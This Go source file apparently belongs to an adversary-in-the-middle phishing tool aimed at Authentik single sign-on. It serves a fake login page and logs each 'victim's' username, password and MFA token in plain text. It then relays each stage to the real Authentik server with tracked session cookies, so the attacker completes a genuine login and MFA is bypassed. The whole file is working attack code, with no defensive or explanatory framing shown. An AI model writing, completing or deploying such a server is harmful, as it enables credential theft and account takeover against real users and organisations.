package server

import (
    "context"
    "encoding/json"
    "errors"
    "fmt"
    "io/ioutil"
    "net/http"
    "path/filepath"
    "strings"
    "time"

    "github.com/gorilla/mux"

    "aitm/pkg/authentik_util"
    "aitm/pkg/logger"
)

const (
    SERVER_ERR_MSG = "Internal server error\n"
    SERVER_BAD_REQ_MSG = "Bad request\n"
)

type AITMServer struct {
    bindAddr string                             // address+port to listen on
    resourceDir string                          // directory containing static resources
    server *http.Server
    targetServerBaseUrl string                  // base URL of real Authentik server
    listeningHTTPS bool                         // toggles HTTPS mode
    certFile string                             // HTTPS cert
    keyFile string                              // private key for HTTPS cert
    authAttemptSessionTracker map[string]string // tracks usernames with auth attempt session cookies
}

type ResponseWriterWithLogging struct {
    responseWriter http.ResponseWriter
    status int
    size int
}

// Creates AITM server instance
func AITMServerFactory(bindAddr string, resourceDir string, authentikUrl string, certFile string, keyFile string) *AITMServer {
    listeningHTTPS := false
    if len(certFile) > 0 || len(keyFile) > 0 {
        listeningHTTPS = true
    }
    return &AITMServer{
        bindAddr: bindAddr,
        resourceDir: resourceDir,
        targetServerBaseUrl: strings.TrimSuffix(authentikUrl, "/"),
        listeningHTTPS: listeningHTTPS,
        certFile: certFile,
        keyFile: keyFile,
        authAttemptSessionTracker: make(map[string]string),
    }
}

func (r *ResponseWriterWithLogging) Header() http.Header {
    return r.responseWriter.Header()
}

func (r *ResponseWriterWithLogging) Write(input []byte) (int, error) {
    size, err := r.responseWriter.Write(input)
    if err == nil {
        r.size = size
    } else {
        logger.Error(fmt.Sprintf("Error when writing response: %s", err.Error()))
        r.size = 0
    }
    return size, err
}

func (r *ResponseWriterWithLogging) WriteHeader(statusCode int) {
    r.responseWriter.WriteHeader(statusCode)
    r.status = statusCode // save status code
}

// Wrapper for http.Handler with added logging.
// Allows us to log file requests and downloads
func HttpHandlerWithLogging(h http.Handler) http.Handler {
    logFunc := func(w http.ResponseWriter, r *http.Request) {
        logger.Debug(fmt.Sprintf("%s %s from %s", r.Method, r.RequestURI, r.RemoteAddr))

        loggingRw := &ResponseWriterWithLogging{
            responseWriter: w,
            status: 0,
            size: 0,
        }

        h.ServeHTTP(loggingRw, r)

        logger.Debug(fmt.Sprintf("Response size of %d, response code %d", loggingRw.size, loggingRw.status))
        if loggingRw.status == http.StatusOK {
            _, fileName := filepath.Split(r.RequestURI)
            logger.Debug(fmt.Sprintf("File %s downloaded by %s", fileName, r.RemoteAddr))
        }
    }
    return http.HandlerFunc(logFunc)
}

func (a *AITMServer) StartServer() error {
    r := mux.NewRouter()
    r.StrictSlash(true)

    // Serve static resources
    fs := http.StripPrefix("/static/", http.FileServer(http.Dir(a.resourceDir)))
    r.PathPrefix("/static/").Handler(HttpHandlerWithLogging(fs))

    // Landing page for login form
    r.HandleFunc(authentik_util.MAIN_FLOW_URL, a.handleAuthFlowHome)

    // Cancel login attempt
    r.HandleFunc("/flows/cancel/", a.redirectToInitialLoginFlow)

    // Redirect home to login flow
    r.HandleFunc("/", a.redirectToInitialLoginFlow)

    // Handles login-related API calls
    r.HandleFunc(authentik_util.AUTH_API_URL, a.handleAuthRequest).Methods("POST")

    a.server = &http.Server{
        Addr:         a.bindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      r,
    }

    // start server in goroutine so it doesn't block
    protocol := "http"
    if a.listeningHTTPS {
        protocol = "https"
    }
    logger.Info(fmt.Sprintf("Starting AITM server to listen on %s://%s", protocol, a.bindAddr))
    logger.Info(fmt.Sprintf("AITM server will reach out to real Authentik server at %s", a.targetServerBaseUrl))
    go func() {
        var err error
        if a.listeningHTTPS {
            err = a.server.ListenAndServeTLS(a.certFile, a.keyFile)
        } else {
            err = a.server.ListenAndServe()
        }
        if err != nil && err.Error() != "http: Server closed" {
            logger.Error(err.Error())
        }
    }()

    return nil
}

func (a *AITMServer) StopServer() error {
    logger.Info("Stopping AITM server")
    emptyContext := context.Background()
    return a.server.Shutdown(emptyContext)
}

// Serve the fake SSO login page from the static assets directory
func (a *AITMServer) handleAuthFlowHome(w http.ResponseWriter, r *http.Request) {
    logger.Debug(fmt.Sprintf("Serving default auth flow page to %s", r.RemoteAddr))
    http.ServeFile(w, r, filepath.Join(a.resourceDir, "auth.html"))
}

// Redirect user to main auth flow page to cancel the current login attempt
// or to perform other redirects
func (a *AITMServer) redirectToInitialLoginFlow(w http.ResponseWriter, r *http.Request) {
    logger.Debug(fmt.Sprintf("Canceling auth flow from %s and redirecting to main auth flow page", r.RemoteAddr))
    http.Redirect(w, r, authentik_util.MAIN_FLOW_URL, http.StatusFound)
}

func handleServerError(w http.ResponseWriter, msg string) {
    logger.Error(msg)
    w.WriteHeader(http.StatusInternalServerError)
    w.Write([]byte(SERVER_ERR_MSG))
}

// Handle authentication requests generated by the login form
func (a *AITMServer) handleAuthRequest(w http.ResponseWriter, r *http.Request) {
    logger.Debug(fmt.Sprintf("Handling auth request from %s", r.RemoteAddr))

    loginData, err := ioutil.ReadAll(r.Body)
    if err != nil {
        handleServerError(w, fmt.Sprintf("Failed to read login request data: %s", err.Error()))
        return
    }
    logger.Debug(fmt.Sprintf("Login request data: %s", string(loginData)))

    // Get login request info
    var loginInfo authentik_util.LoginRequest
    if err = json.Unmarshal(loginData, &loginInfo); err != nil {
        handleServerError(w, fmt.Sprintf("Failed to parse login request struct: %s", err.Error()))
        return
    }

    logger.Debug(fmt.Sprintf("Auth stage: %s", loginInfo.Stage))
    logger.Debug(fmt.Sprintf("Username: %s", loginInfo.Username))
    logger.Debug(fmt.Sprintf("Password: %s", loginInfo.Password))
    logger.Debug(fmt.Sprintf("Token: %s", loginInfo.Token))

    // All login requests must contain login phase and username
    if len(loginInfo.Stage) == 0 {
        handleServerError(w, "No authentication stage provided in login request.")
        return
    }
    if len(loginInfo.Username) == 0 {
        handleServerError(w, "No username provided in login request.")
        return
    }

    // Forward login attempt for the auth stage to real Authentik server
    victimResp, statusCode, err := a.forwardAuthStage(&loginInfo)
    if err != nil {
        handleServerError(w, fmt.Sprintf("Failed to forward login attempt to Authentik server: %s", err.Error()))
        return
    }

    // Send back response to victim
    w.WriteHeader(statusCode)
    w.Write([]byte(victimResp))
    return
}

// Use the information provided by the victim's login attempt to authenticate against
// the real Authentik server. Generates an appropriate response to the victim
func (a *AITMServer) forwardAuthStage(loginInfo *authentik_util.LoginRequest) (string, int, error) {
    reqHeaders := map[string]string{
        "User-Agent": authentik_util.USER_AGENT,
    }

    if loginInfo.Stage == authentik_util.AUTH_STAGE_IDENTIFICATION {
        // Phase 1 - victim provides only username, which gets forwarded to the Authentik server

        // Get auth attempt cookie to use in future requests
        authAttemptCookie, err := authentik_util.GetAuthAttemptCookie(a.targetServerBaseUrl, loginInfo.Username, reqHeaders)
        if err != nil {
            return "", -1, errors.New(fmt.Sprintf("Failed to get auth attempt cookie for user %s: %s", loginInfo.Username, err.Error()))
        }
        a.authAttemptSessionTracker[loginInfo.Username] = authAttemptCookie
        reqCookieStr := fmt.Sprintf("%s=%s", authentik_util.AUTH_ATTEMPT_COOKIE_NAME, authAttemptCookie)

        // Submit username and process server response
        return authentik_util.SubmitUsername(a.targetServerBaseUrl, loginInfo.Username, reqCookieStr, reqHeaders)
    } else if loginInfo.Stage == authentik_util.AUTH_STAGE_PASSWORD || loginInfo.Stage == authentik_util.AUTH_STAGE_MFA {
        // At this stage, the username should already have an auth attempt cookie

        // Get cookies for user
        authAttemptCookie, ok := a.authAttemptSessionTracker[loginInfo.Username]
        if !ok {
            return "", -1, errors.New(fmt.Sprintf("No auth attempt token found for user %s.", loginInfo.Username))
        }
        reqCookieStr := fmt.Sprintf("%s=%s", authentik_util.AUTH_ATTEMPT_COOKIE_NAME, authAttemptCookie)

        if loginInfo.Stage == authentik_util.AUTH_STAGE_PASSWORD {
            // Phase 2 - victim provides password, which gets forwarded to the Authentik server
            if len(loginInfo.Password) == 0 {
                return "", -1, errors.New("No password provided in password stage.")
            }

            // Submit password and process server response
            return authentik_util.SubmitPassword(a.targetServerBaseUrl, loginInfo.Username, loginInfo.Password, reqCookieStr, reqHeaders)
        } else {
            // Phase 3 - victim provides MFA token, which gets forwarded to the Authentik server
            if len(loginInfo.Token) == 0 {
                return "", -1, errors.New("No MFA token provided in MFA stage.")
            }

            // Submit MFA token and process server response
            return authentik_util.SubmitMfaToken(a.targetServerBaseUrl, loginInfo.Username, loginInfo.Token, reqCookieStr, reqHeaders)
        }
    } else {
        return "", -1, errors.New(fmt.Sprintf("Unsupported login stage: %s", loginInfo.Stage))
    }
}
